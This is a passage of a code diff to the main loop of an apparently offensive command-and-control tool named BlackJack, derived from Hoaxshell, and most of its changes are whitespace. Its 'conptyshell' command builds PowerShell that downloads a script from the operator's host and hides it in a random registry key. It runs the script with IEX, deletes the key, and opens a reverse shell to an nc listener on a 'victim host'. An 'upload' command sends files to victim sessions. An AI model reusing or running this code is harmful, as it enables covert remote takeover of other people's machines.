                     print(f"Active threads ({len(threads)}):\n")
                     for thread in threads:
                         thread_names.append(thread.name)
 
                     print_columns(thread_names)
+
 
                 elif cmd == 'upload':
 
@@ -1273,11 +1311,11 @@ def main():
                     if not session_id:
                         print('Failed to interpret session_id.')
                         Main_prompt.ready = True
-                        continue
+                        continue    
 
                     sessions_check = Sessions_Manager.sessions_check(session_id)
-
-                    if sessions_check[0]:
+                    
+                    if sessions_check[0]:                            
 
                         # Check if file exists
                         if os.path.isfile(file_path):
@@ -1290,18 +1328,21 @@ def main():
                                 # Check if any sibling server has an active pseudo shell on that session
                                 shell_occupied = core.is_shell_session_occupied(session_id)
 
-                                if not shell_occupied:
+                                if not shell_occupied:    
                                     # Check who is the owner of the shell session
                                     session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
+                                
                                     if session_owner_id == core.return_server_uniq_id():
                                         File_Smuggler.upload_file(file_contents, cmd_list[2], session_id)
-                                    else:
+                                    
+                                    else:        
                                         core.send_receive_one_encrypted(session_owner_id, [file_contents, cmd_list[2], session_id], 'upload_file')
 
                                 else:
                                     print(f'\r[{INFO}] The session is currently being used by a sibling server.')
                                     Main_prompt.ready = True
-                                    continue
+                                    continue    
+                                    
 
                         else:
                             print(f'\r[{ERR}] File {file_path} not found.')
@@ -1315,21 +1356,24 @@ def main():
                         print(sessions_check[1])
                         Main_prompt.ready = True
 
+
+
                 elif cmd == 'conptyshell':
                     
                     lhost = parse_lhost(cmd_list[1])
                     try: lport = int(cmd_list[2])
-                    except: lport = -1
+                    except: lport = -1                    
                     session_id = cmd_list[3]
                     sessions_check = Sessions_Manager.sessions_check(session_id)
                     
                     if sessions_check[0]:
+                        
                         # Parse LHOST
                         if not lhost:
                             print(f'\r[{ERR}] Failed to parse LHOST value.')
                             continue
-
-                        # Parse LPORT
+                        
+                        # Parse LPORT                    
                         if not (lport >= 1 and lport <= 65535):
                             print(f'\r[{ERR}] Failed to parse LPORT value.')
                             continue
@@ -1345,10 +1389,10 @@ def main():
                         session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
 
                         # Prepare ConPtyShell
-                        if not os.path.isfile(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1'):
+                        if not os.path.isfile(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1'):                            
                             print(f'\r[{ERR}] Invoke-ConPtyShell.ps1 not found.')
                             continue
-
+                        
                         script_data = get_file_contents(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1', mode = 'r')
                         func_name = value_name = get_random_str(10)
                         script_data = script_data.replace('*LHOST*', lhost).replace('*LPORT*', str(lport)).replace('*FUNC*', func_name)
@@ -1364,43 +1408,51 @@ def main():
                         #       went wrong, the user would not receive stderr.
                         #    2) Run as a new process, given that the first pre-flight check didn't error out.
 
-                        # Construct Blackjack issued command to request and exec ConPtyShell
+                        # Construct BlackJack issued command to request and exec ConPtyShell
                         rand_key = get_random_str(5)
                         value_name = get_random_str(5)
                         script_src = f'http://{lhost}:{File_Smuggler_Settings.bind_port}/{ticket}'
-                        reg_polution = f'New-Item -Path "HKCU:\SOFTWARE\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\SOFTWARE\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
-                        exec_script = f'(Get-ItemPropertyValue -Path "HKCU:\SOFTWARE\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
-                        remove_src = f'Remove-Item -Path "HKCU:\Software\{rand_key}" -Recurse'
+                        reg_polution = f'New-Item -Path "HKCU:\\SOFTWARE\\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\SOFTWARE\\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
+                        exec_script = f'(Get-ItemPropertyValue -Path "HKCU:\\SOFTWARE\\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
+                        remove_src = f'Remove-Item -Path "HKCU:\\Software\\{rand_key}" -Recurse'
                         new_proc = Exec_Utils.new_process_wrapper(f"{exec_script}; {func_name}; {remove_src}", session_id)
                         execution_object = Exec_Utils.ps_try_catch_wrapper(f'{reg_polution};{exec_script};({new_proc})', error_action = remove_src)
-
+                        
                         #print(execution_object)
+
                         blackjack_cmd = {
                             'data' : execution_object,
                             'quiet' : False
                         }
+
                         # Append script for execution
                         if session_owner_id == core.return_server_uniq_id():
+
                             blackjack_cmd['issuer'] = 'self'
+
                             # Start listener
                             os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
                             sleep(0.2)
-                            Blackjack.command_pool[session_id].append(blackjack_cmd)
+                            Hoaxshell.command_pool[session_id].append(blackjack_cmd)
 
                         else:
+
                             try:
                                 verified = input(f'\r[{WARN}] This session belongs to a sibling server. If the victim host cannot directly reach your host, this operation will fail. Proceed? [y/n]: ')
                             except:
                                 print()
                                 verified = None
+                            
                             if verified.lower().strip() in ['y', 'yes']:
                                 # Start listener
                                 os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
                                 blackjack_cmd['issuer'] = core.return_server_uniq_id()
                                 Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, blackjack_cmd)
-
+                                        
                     else:
                         print(sessions_check[1])
+
+                        
 
                 elif cmd == 'cmdinspector':
 
@@ -1410,6 +1462,7 @@ def main():
 
                         if option == 'off':
                             Session_Defender.is_active = False
+
                         elif option == 'on':
                             Session_Defender.is_active = True
                         
@@ -1417,6 +1470,8 @@ def main():
 
                     else:
                         print('Value can be on or off.')
+
+
 
                 elif cmd == 'purge':
 
@@ -1433,9 +1488,11 @@ def main():
                     else:
                         continue
 
+
                 else:
                     continue
-
+        
+        
         except KeyboardInterrupt:
             
             if not Main_prompt.ready:
@@ -1446,13 +1503,14 @@ def main():
                 sys.stdout.flush()
                 print()
                 continue
-
+            
             if Main_prompt.exec_active:
                 Main_prompt.exec_active = False
                 print('\r')
                 continue
 
             blackjack_out()
+            
 
 if __name__ == '__main__':
     main()
